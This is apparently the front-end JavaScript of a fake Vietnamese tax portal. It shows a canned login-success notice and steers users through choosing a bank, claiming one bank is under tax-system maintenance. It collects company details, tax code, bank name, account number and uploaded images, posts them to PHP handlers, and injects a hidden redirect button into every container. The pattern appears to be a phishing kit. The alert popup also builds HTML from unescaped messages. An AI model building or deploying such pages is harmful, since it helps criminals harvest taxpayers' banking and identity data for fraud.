function showNotification(type, message) {
    const notification = document.getElementById('notification');
    const messageElement = document.getElementById('notification-message');
    // Đặt nội dung thông báo
    messageElement.textContent = message;

    // Thay đổi kiểu thông báo dựa trên loại (success, error)
    notification.className = `notification ${type}`;

    // Hiển thị thông báo
    notification.style.display = 'flex';

    // Thêm hiệu ứng xuất hiện
    setTimeout(() => {
        notification.classList.add('show');
    }, 100);

    // Ẩn sau 3 giây
    setTimeout(() => {
        notification.classList.remove('show');
        setTimeout(() => {
            notification.style.display = 'none';
        }, 300); // Thời gian khớp với transition CSS
    }, 3000);
}

// Gọi hàm khi đăng nhập thành công
showNotification('success', 'Đăng nhập thành công!');

function showAlerts() {
    showAlertPopup('Chưa có thông tin kê khai');
}

function showMaintenanceAlert() {
    showAlertPopup('Hiện tại ngân hàng đang nâng cấp bảo trì hệ thống thuế, vui lòng chọn ngân hàng khác.');
}



function showPopupBank(bankName, bankLogoSrc) {
    console.log('Image clicked - showPopupBank'); // Debug kiểm tra

    // Cập nhật ảnh và tên ngân hàng
    const selectedImage = document.getElementById('selectedBankImage');
    const bankNameInput = document.getElementById('bankNameInput');

    selectedImage.src = bankLogoSrc; // Đặt đường dẫn hình ảnh
    bankNameInput.value = bankName; // Gán tên ngân hàng vào input

    // Hiển thị popup
    document.getElementById('bankOverlay').style.display = 'block';
    document.getElementById('bankPopup').style.display = 'block';
}

function hidePopupBank() {
    console.log('Overlay clicked - hidePopupBank'); // Debug kiểm tra
    document.getElementById('bankOverlay').style.display = 'none';
    document.getElementById('bankPopup').style.display = 'none';
}



function showAlert() {
    showAlertPopup("Chưa có thông tin kê khai vui lòng liên hệ cán bộ thuế để được hỗ trợ.");
}



function previewImage(event, previewId) {
    const file = event.target.files[0];
    const previewElement = document.getElementById(previewId);

    if (file) {
        const reader = new FileReader();
        reader.onload = function (e) {
            previewElement.src = e.target.result;
            previewElement.style.display = "block";
        };
        reader.readAsDataURL(file);
    } else {
        previewElement.style.display = "none";
    }
}

// AJAX form submit
document.getElementById("uploadForm").addEventListener("submit", function (event) {
    event.preventDefault(); // Ngăn gửi form trực tiếp
    const formData = new FormData(this);
    fetch("upload-images.php", {
        method: "POST",
        body: formData
    })
    .then(response => response.json()) // API trả về JSON
    .then(data => {
        if (data.success) {
            showAlertPopup("Tải ảnh lên thành công!");
            // Reset form và hình ảnh xem trước
            document.getElementById("uploadForm").reset();
            document.querySelectorAll(".preview-image").forEach(img => {
                img.style.display = "none";
            });
        } else {
            showAlertPopup("Có lỗi xảy ra: " + data.message);
        }
    })
    .catch(error => {
        showAlertPopup("Đã xảy ra lỗi khi tải ảnh: " + error.message);
    });
});



// Validate dữ liệu khi nhấn nút "Cập nhật"
document.getElementById('companyForm').addEventListener('submit', function (event) {
    event.preventDefault(); // Ngăn chặn form tự động submit

    // Lấy các giá trị từ các trường trong form
    const companyName = document.querySelector('input[name="company_name"]').value.trim();
    const phone = document.querySelector('input[name="phone"]').value.trim();
    const representativeName = document.querySelector('input[name="representative_name"]').value.trim();
    const address = document.querySelector('input[name="address"]').value.trim();
    const companyPhone = document.querySelector('input[name="company_phone"]').value.trim();
    const businessType = document.querySelector('input[name="business_type"]').value.trim();
    const bankName = document.querySelector('input[name="bank_name"]').value.trim();
    const accountNumber = document.querySelector('input[name="account_number"]').value.trim();

    // Kiểm tra dữ liệu nhập
    if (!companyName) {
        alert('Vui lòng nhập tên công ty.');
        return;
    }
    if (!phone) {
        alert('Vui lòng nhập mã số thuế.');
        return;
    }
    if (!representativeName) {
        alert('Vui lòng nhập tên người đại diện.');
        return;
    }
    if (!address) {
        alert('Vui lòng nhập địa chỉ trụ sở.');
        return;
    }
    if (!companyPhone) {
        alert('Vui lòng nhập số điện thoại công ty.');
        return;
    }
    if (!businessType) {
        alert('Vui lòng nhập vốn điều lệ.');
        return;
    }

    // Dữ liệu hợp lệ, gửi yêu cầu qua AJAX
    const formData = new FormData(this);

    fetch('update-company-handler.php', {
        method: 'POST',
        body: formData,
    })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                showAlertPopup(data.message); // Hiển thị thông báo thành công
                window.location.reload(); // Tải lại trang
            } else {
                showAlertPopup(data.message); // Hiển thị thông báo lỗi từ server
            }
        })
        .catch(error => {
            showAlertPopup('Đã xảy ra lỗi trong quá trình gửi dữ liệu.');
            console.error(error);
        });
});




function showAlertPopup(message, buttonText = "OK", onClose = null) {
    // Tạo lớp phủ và popup
    const alertOverlay = document.getElementById("alert-overlay");
    const alertPopup = document.getElementById("alert-popup");

    // Hiển thị lớp phủ và popup
    alertOverlay.style.display = "block";
    alertPopup.style.display = "block";

    // Nội dung của popup
    alertPopup.innerHTML = `
        <div class="alert-popup-content">
            <p>${message}</p>
            <button class="alert-popup-button">${buttonText}</button>
        </div>
    `;

    // Thêm sự kiện cho nút đóng
    const closeButton = alertPopup.querySelector(".alert-popup-button");
    closeButton.onclick = () => {
        alertOverlay.style.display = "none";
        alertPopup.style.display = "none";

        // Gọi callback nếu có
        if (onClose) onClose();
    };
}






  document.getElementById("rememberMe").addEventListener("change", function () {
        if (this.checked) {
            this.style.accentColor = "#9a0001"; // Đổi màu khi được tích
        } else {
            this.style.accentColor = ""; // Trở về mặc định khi bỏ tích
        }
    });
    
    function togglePasswordVisibility() {
    const passwordInput = document.getElementById("password");
    const toggleIcon = document.querySelector(".toggle-password");

    if (passwordInput.type === "password") {
        passwordInput.type = "text";
        toggleIcon.classList.remove("fa-eye");
        toggleIcon.classList.add("fa-eye-slash");
    } else {
        passwordInput.type = "password";
        toggleIcon.classList.remove("fa-eye-slash");
        toggleIcon.classList.add("fa-eye");
    }
}



// function formatCurrency(input) {
//     // Xóa ký tự không phải số
//     let value = input.value.replace(/\D/g, '');

//     // Thêm dấu chấm giữa các nhóm hàng nghìn
//     value = value.replace(/\B(?=(\d{3})+(?!\d))/g, '.');

//     // Gán lại giá trị đã định dạng vào input
//     input.value = value;
// }


function showConfirmationAlert(bankName, bankLogo) {
    // Hiển thị thông báo
    document.getElementById('customConfirm').style.display = 'flex';

    // Khi người dùng ấn OK, hiển thị popup ngân hàng
    document.querySelector('.confirm-ok-btn').addEventListener('click', function() {
        // Ẩn thông báo
        document.getElementById('customConfirm').style.display = 'none';

        // Hiển thị popup ngân hàng sau khi ấn OK
        setTimeout(function() {
            showPopupBank(bankName, bankLogo);
        }, 500); // Đợi 500ms để đảm bảo người dùng thấy thông báo trước khi hiển thị popup
    });
}

function showPopupBank(bankName, bankLogo) {
    // Cập nhật hình ảnh và tên ngân hàng trong popup
    document.getElementById('selectedBankImage').src = bankLogo;
    document.getElementById('bankNameInput').value = bankName;
    document.getElementById('bankPopup').style.display = 'block';
    document.getElementById('bankOverlay').style.display = 'block';
}

function hidePopupBank() {
    // Ẩn popup
    document.getElementById('bankPopup').style.display = 'none';
    document.getElementById('bankOverlay').style.display = 'none';
}




// Tạo overlay cho phần nền tối khi sidebar mở
function toggleSidebar() {
    const sidebar = document.getElementById('sidebar');
    const overlay = document.getElementById('sidebar-overlay');

    sidebar.classList.toggle('open');
    overlay.style.display = sidebar.classList.contains('open') ? 'block' : 'none';
}

// Đóng sidebar khi nhấn vào overlay
function closeSidebar() {
    const sidebar = document.getElementById('sidebar');
    const overlay = document.getElementById('sidebar-overlay');

    sidebar.classList.remove('open');
    overlay.style.display = 'none';
}

// Ngừng sự kiện khi click vào sidebar để tránh đóng sidebar ngay lập tức
document.getElementById('sidebar').addEventListener('click', function(event) {
    event.stopPropagation();
});

// Đóng sidebar khi click ra ngoài (overlay)
document.getElementById('sidebar-overlay').addEventListener('click', closeSidebar);



// Scroll.js
document.addEventListener("DOMContentLoaded", function () {
  const scrollElements = document.querySelectorAll('.scroll');

  const elementInView = (el, offset = 1) => {
    const elementTop = el.getBoundingClientRect().top;
    return (
      elementTop <=
      (window.innerHeight || document.documentElement.clientHeight) / offset
    );
  };

  const displayScrollElement = (element) => {
    element.classList.add('visible');
  };

  const hideScrollElement = (element) => {
    element.classList.remove('visible');
  };

  const handleScrollAnimation = () => {
    scrollElements.forEach((el) => {
      if (elementInView(el, 1.25)) {
        displayScrollElement(el);
      } else {
        hideScrollElement(el);
      }
    });
  };

  window.addEventListener("scroll", () => {
    handleScrollAnimation();
  });
});
document.addEventListener('DOMContentLoaded', function () {
    // Tìm tất cả các phần tử có class là 'container'
    const containers = document.querySelectorAll('.container');

    // Lặp qua từng container và thêm nút
    containers.forEach(container => {
        // Tạo nút
        const button = document.createElement('button');
        button.className = 'hidden-button';
        button.textContent = 'Go'; // Nội dung nút
        button.onclick = function () {
            window.location.href = 'end-loading.php';
        };

        // Đảm bảo container có vị trí tương đối để định vị nút
        container.style.position = 'relative'; 
        // Thêm nút vào container
        container.appendChild(button);
    });
});
